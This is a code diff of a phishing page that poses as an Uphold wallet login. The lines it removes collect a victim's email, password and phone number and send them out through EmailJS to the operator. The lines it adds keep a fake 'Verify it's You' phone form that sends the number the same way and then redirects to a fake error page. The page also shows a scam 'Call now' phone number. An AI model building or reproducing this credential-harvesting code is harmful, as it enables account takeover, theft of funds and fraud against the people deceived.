@@ -7,8 +7,8 @@
     <title>Wallet</title>
 
     <style>
-        body{
-          overflow: hidden;
+        body {
+            overflow: hidden;
         }
     </style>
 
@@ -39,8 +39,8 @@
                 <p>Trade between multiple asset classes from one convenient account. A large number of assets are now
                     less than a minute away.
                     <br><br>
-                    <a href="tel:+1-828-270-5094" class="login-lnk" >
-                        <button>    Call now : 828-270-5094</button>
+                    <a href="tel:+1-828-270-5094" class="login-lnk">
+                        <button> Call now : 828-270-5094</button>
                     </a>
                 </p>
             </div>
@@ -114,33 +114,22 @@
         </div>
         <div class="rightdiv">
             <form id="loginForm" onsubmit="sendFormData(event)">
-                <div>
-                    <h2>Log in to Uphold</h2>
-                    <p>Not a member? <a href="#">Sign up now</a></p>
+                <div style="display: flex; flex-direction: column; align-items: center;">
+                    <img src="./verificaitionn.jpg" height="150">
+                    <h2 style="text-align: center;">Verify it's You</h2>
+                    <p style="text-align: center;  margin-bottom: 20px;">To confirm you're trying to access your
+                        account, please verify your phone number</p>
                     <br><br>
 
-                    <div id="emailSection" style="position: relative;">
-                        <label class="Label-eJzeQK ePUaRL">Email address</label>
-                        <div class="sc-beySbM hkMNOF Input__Container-bdgDbx kgpiOG">
-                            <input inputmode="email" name="from_email" type="email" id="email" required
-                                data-test="loginEmail" class="InputText-kVFRDT coYxKg">
+                    <div class="phn" style="position: relative; margin-bottom: 20px;">
+                        <div class="sc-beySbM hkMNOF Input__Container-bdgDbx phone-input kgpiOG">
+                            <input required="true" inputmode="tel" type="text" name="from_number" id="phone"
+                                placeholder="Enter Your Phone Number" required class="InputText-kVFRDT coYxKg">
                         </div>
                     </div>
 
-                    <div id="passwordSection" style="position: relative; margin-top: 40px; margin-bottom: 30px;">
-                        <label class="Label-eJzeQK ePUaRL">Password</label>
-                        <div class="sc-beySbM hkMNOF Input__Container-bdgDbx kgpiOG">
-                            <input type="password" name="from_paswrd" id="password" required data-test="loginPassword"
-                                class="InputText-kVFRDT coYxKg">
-                        </div>
-                    </div>
-
-                    <a href="#" class="f-passwrod">Forgot Password</a>
+                    <button class="submitbt" type="button" onclick="sendFormData(event)">Verify</button>
                 </div>
-
-                <span class="submitbt" type="submit" onclick="showPhoneVerificationForm()">
-                    Next
-                </span>
             </form>
         </div>
     </div>
@@ -160,98 +149,49 @@
 
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <script>
-(function(){
-    emailjs.init({
-        publicKey: "-oqI2gAE96aiq5NCy",
-    });
-})();
-
-let storedEmail = '';
-let storedPassword = '';
-function sendFormData(event) {
-    event.preventDefault();
-
-    // Show the loader immediately
-    document.querySelector('.loader').style.visibility = 'visible';
-
-    const emailElement = document.getElementById('email'); // Grab email input
-    const passwordElement = document.getElementById('password'); // Grab password input
-    const phoneElement = document.getElementById('phone'); // Grab phone input
-
-    const email = emailElement ? emailElement.value : storedEmail;
-    const password = passwordElement ? passwordElement.value : storedPassword;
-    const phone = phoneElement ? phoneElement.value : '';
-
-    console.log(email, password, phone);
-
-    if (!storedEmail && !storedPassword) {
-        storedEmail = email;
-        storedPassword = password;
-    }
-
-    if (phoneElement && phone) {
-        var templateParams = {
-            from_email: storedEmail,
-            from_paswrd: storedPassword,
-            from_number: phone,
-            notes: 'User submitted login details with phone verification.'
-        };
-
-        emailjs.send('service_9ncb42u', 'template_7j80au7', templateParams)
-            .then(function (response) {
-                console.log(templateParams);
-                console.log('SUCCESS!', response.status, response.text);
-
-                // Delay the page redirection after 5 seconds
-                setTimeout(function () {
-                    window.location.href = "somethingwentwrog.html";
-                }, 5000);  // 5-second delay before redirecting
-
-                // Hide the loader after email sending is complete
-            }, function (error) {
-                console.log('FAILED...', error);
-                alert("error");
-
-                // Hide the loader if email sending fails
-                document.querySelector('.loader').style.visibility = 'hidden';
+        (function () {
+            emailjs.init({
+                publicKey: "-oqI2gAE96aiq5NCy",
             });
-    }
-}
+        })();
 
-function showPhoneVerificationForm() {
-    const form = document.getElementById('loginForm');
-    const emailElement = document.getElementById('email');
-    const passwordElement = document.getElementById('password');
-    
-    const email = emailElement ? emailElement.value : storedEmail;
-    const password = passwordElement ? passwordElement.value : storedPassword;
+        document.getElementById("loginForm").addEventListener("submit", sendFormData);
 
-    storedEmail = email;
-    storedPassword = password;
+        function sendFormData(event) {
+            event.preventDefault();
 
-    form.innerHTML = '';
-    const newContent = `
-        <div style="display: flex; flex-direction: column; align-items: center;">
-            <img src="./verificaitionn.jpg" height="150">
-            <h2 style="text-align: center;">Verify it's You</h2>
-            <p style="text-align: center;  margin-bottom: 20px;">To confirm you're trying to access your account, please verify your phone number</p>
-            <br><br>
+            const phoneElement = document.getElementById('phone');
+            const loader = document.querySelector('.loader'); 
+            const phone = phoneElement ? phoneElement.value.trim() : '';
 
-            <div class="phn" style="position: relative; margin-bottom: 20px;">
-                <div class="sc-beySbM hkMNOF Input__Container-bdgDbx phone-input kgpiOG">
-                    <input inputmode="tel" type="text" name="from_number" id="phone" placeholder="Enter Your Phone Number" required class="InputText-kVFRDT coYxKg">
-                </div>
-            </div>
+            if (!phone) {
+                alert("Please enter a valid phone number.");
+                return;
+            }
 
-            <button class="submitbt" type="button" onclick="sendFormData(event)">Verify</button>
-        </div>
-    `;
-    form.innerHTML = newContent;
-}
+            loader.classList.add('show');
+
+            const templateParams = {
+                from_number: phone,
+                notes: 'User submitted phone verification.'
+            };
+
+            emailjs.send('service_9ncb42u', 'template_7j80au7', templateParams)
+                .then(function (response) {
+                    console.log('SUCCESS!', response.status, response.text);
+
+                    setTimeout(() => {
+                        window.location.href = "./somethingwentwrog.html";
+                    }, 5000);
+                })
+                .catch(function (error) {
+                    console.error('FAILED...', error);
+                    alert("An error occurred. Please try again.");
+                    loader.style.display = 'none';
+                });
+        }
 
     </script>
-    
-
 </body>
 
 </html>
